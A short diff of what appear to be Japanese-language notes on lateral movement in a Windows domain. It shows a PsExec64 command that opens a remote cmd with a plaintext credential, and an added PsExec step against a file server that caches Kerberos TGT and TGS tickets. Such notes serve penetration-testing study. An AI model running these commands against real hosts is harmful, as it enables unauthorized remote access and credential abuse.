@@ -11,3 +11,8 @@ Telnetのようにして対話セッションを横展開先で開ける。
 ```
 ./PsExec64.exe -i \\<ターゲットホスト名> -u corp\jen -p Nexus123! cmd
 ```
+
+2. ファイル共有にアクセスしてTGTとTGSをキャッシュさせる。
+```
+.\PsExec.exe \\FILES04 cmd
+```
